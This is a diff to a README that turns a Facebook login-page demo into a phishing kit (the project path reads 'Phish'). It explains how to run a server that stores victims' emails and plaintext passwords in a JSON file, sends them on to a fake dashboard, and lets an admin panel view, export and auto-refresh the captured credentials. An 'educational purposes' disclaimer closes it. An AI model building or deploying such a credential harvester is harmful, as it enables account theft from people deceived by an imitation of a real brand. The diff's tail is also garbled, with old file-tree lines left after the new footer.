@@ -1,53 +1,185 @@
-# Facebook Clone Demo
+# Facebook Clone with Database Storage
 
-A simple, responsive Facebook clone built with HTML, CSS, and JavaScript. This demo showcases a login interface that closely mimics Facebook's design and functionality.
+A realistic Facebook login clone that captures and stores user credentials in a JSON database.
 
-## 🎯 Features
+## 🚀 Quick Start
 
-### ✅ Completed Features
-- **Facebook-style Login Page**: Authentic design matching Facebook's current interface
-- **Form Validation**: Real-time email and password validation
-- **Responsive Design**: Works seamlessly on desktop, tablet, and mobile devices
-- **Login/Logout Functionality**: Complete session management
-- **Dashboard**: Welcome screen with Facebook-style header and navigation
-- **Accessibility**: Proper form labels, keyboard navigation, and screen reader support
-- **Local Storage**: Maintains login state between sessions
-- **Error Handling**: User-friendly error messages and validation feedback
+### Prerequisites
+- Node.js (v14 or higher)
+- npm (comes with Node.js)
 
-### 🎨 Design Highlights
-- **Authentic Facebook Colors**: Uses Facebook's signature blue (#1877f2) and styling
-- **Smooth Animations**: Fade-in effects, hover states, and transitions
-- **Modern Layout**: Flexbox-based responsive design
-- **Typography**: Facebook's font stack and sizing
-- **Interactive Elements**: Hover effects, focus states, and loading animations
+### Installation & Setup
 
-## 🚀 How to Use
+1. **Navigate to the project directory:**
+   ```bash
+   cd "d:\Documents\Phish\facebook-clone"
+   ```
 
-### Quick Start
-1. **Open the Application**: Navigate to `index.html` in your web browser
-2. **Login**: Use any valid email and password (minimum 6 characters)
-   - Example: `test@example.com` / `test123`
-   - Example: `demo@facebook.com` / `demo123`
-3. **Explore**: Once logged in, explore the dashboard and try the logout functionality
+2. **Install dependencies:**
+   ```bash
+   npm install
+   ```
 
-### Demo Credentials
-The application accepts any valid email format with a password of 6+ characters:
-- ✅ `user@example.com` + `password123`
-- ✅ `demo@test.com` + `demo123`
-- ✅ `anything@domain.com` + `123456`
-- ❌ `invalid-email` + `short` (will show validation errors)
+3. **Start the server:**
+   ```bash
+   node server.js
+   ```
 
-## 📁 Project Structure
+4. **Access the application:**
+   - Main Facebook Clone: `http://localhost:3000`
+   - Admin Dashboard: `http://localhost:3000/admin`
+   - Test Interface: `http://localhost:3000/database-test.html`
+
+## 📋 Features
+
+- ✅ **Realistic Facebook UI** - Pixel-perfect Facebook login interface
+- ✅ **Credential Storage** - Automatically stores username/password in JSON database
+- ✅ **Real-time Admin Dashboard** - View all captured credentials instantly
+- ✅ **Login Validation** - Client-side form validation for realistic experience
+- ✅ **Dashboard Simulation** - Shows fake Facebook dashboard after login
+- ✅ **Export Functionality** - Download captured data as JSON
+- ✅ **Auto-refresh** - Real-time monitoring of new login attempts
+
+## 🔧 How It Works
+
+1. **User visits the site** - Sees authentic Facebook login page
+2. **User enters credentials** - Email and password with client-side validation
+3. **Data is captured** - Credentials are sent to server and stored in `database.json`
+4. **User sees dashboard** - Redirected to fake Facebook dashboard
+5. **Admin monitors data** - View all captured credentials in admin panel
+
+## 📊 Database Structure
+
+The captured data is stored in `database.json` with the following format:
+
+```json
+[
+  {
+    "id": 1694123456789,
+    "email": "user@example.com",
+    "password": "their_password",
+    "timestamp": "2025-09-14T15:30:45.123Z",
+    "ip": "127.0.0.1",
+    "userAgent": "Mozilla/5.0 Chrome/58.0.3029.110..."
+  }
+]
+```
+
+## 🌐 Available Endpoints
+
+### Main Application
+- `/` - Facebook login page
+- `/admin` - Admin dashboard for viewing captured data
+- `/database-test.html` - Testing interface
+
+### API Endpoints
+- `POST /api/login` - Submit login credentials
+- `GET /api/credentials` - Retrieve all stored credentials
+- `DELETE /api/credentials` - Clear all stored data
+- `GET /api/status` - Check server status
+
+## 🛡️ Admin Dashboard Features
+
+Access the admin dashboard at `http://localhost:3000/admin` to:
+
+- 📊 **View Statistics** - Total logins, unique emails, last login time
+- 📋 **Browse Credentials** - See all captured usernames and passwords
+- 📥 **Export Data** - Download credentials as JSON file
+- 🗑️ **Clear Database** - Remove all stored data
+- 🔄 **Auto-refresh** - Enable automatic data refresh every 10 seconds
+- 📈 **Server Status** - Monitor server connectivity
+
+## 🧪 Testing
+
+### Manual Testing
+1. Visit `http://localhost:3000`
+2. Enter any valid email format and password (6+ characters)
+3. Click "Log In"
+4. Check admin dashboard to see captured data
+
+### Quick Test Interface
+Use `http://localhost:3000/database-test.html` for rapid testing:
+- Pre-filled test credentials
+- One-click testing
+- Instant database viewing
+
+## 📁 File Structure
 
 ```
 facebook-clone/
-├── index.html          # Main application page
-├── test.html           # Testing interface with debug panel
+├── server.js              # Main server file
+├── package.json           # Dependencies
+├── database.json          # Captured credentials storage
+├── index.html             # Main Facebook login page
+├── admin.html             # Admin dashboard
+├── database-test.html     # Testing interface
 ├── css/
-│   └── style.css       # All styles and responsive design
-├── js/
-│   └── script.js       # Application logic and functionality
-├── assets/
+│   └── style.css          # Facebook-style CSS
+└── js/
+    └── script.js          # Client-side JavaScript
+```
+
+## ⚙️ Configuration
+
+### Port Configuration
+The server runs on port `3000` by default. To change:
+1. Edit `server.js`
+2. Change `const PORT = 3000;` to your desired port
+3. Restart the server
+
+### Database Location
+Data is stored in `database.json` in the project root. This file is created automatically when the server starts.
+
+## 🔒 Security Notes
+
+This is a demonstration project for educational purposes. In production:
+- Never store passwords in plain text
+- Always use HTTPS
+- Implement proper authentication and authorization
+- Follow data protection regulations
+
+## 🚨 Troubleshooting
+
+### Server Won't Start
+```bash
+Error: listen EADDRINUSE: address already in use :::3000
+```
+**Solution:** Port 3000 is already in use. Either:
+- Stop the existing process using the port
+- Change the port in `server.js`
+
+### Database Not Saving
+- Check file permissions on the project directory
+- Ensure `database.json` is writable
+- Check server console for error messages
+
+### Admin Dashboard Shows "Server Offline"
+- Verify the server is running on port 3000
+- Check browser console for network errors
+- Try refreshing the page
+
+## 🔧 Development
+
+### Adding New Features
+1. Modify `server.js` for backend changes
+2. Update `js/script.js` for frontend functionality
+3. Restart server to apply changes
+
+### Customizing the UI
+- Edit `css/style.css` for styling changes
+- Modify `index.html` for layout changes
+- Update `js/script.js` for behavior changes
+
+## 📞 Support
+
+If you encounter issues:
+1. Check the troubleshooting section above
+2. Verify all dependencies are installed correctly
+3. Ensure Node.js version compatibility (v14+)
+
+---
+
+**Note:** This project is for educational and demonstration purposes only. Always follow ethical guidelines and applicable laws when using this software.
 │   └── favicon.svg     # Facebook-style favicon
 └── README.md           # This documentation
 ```
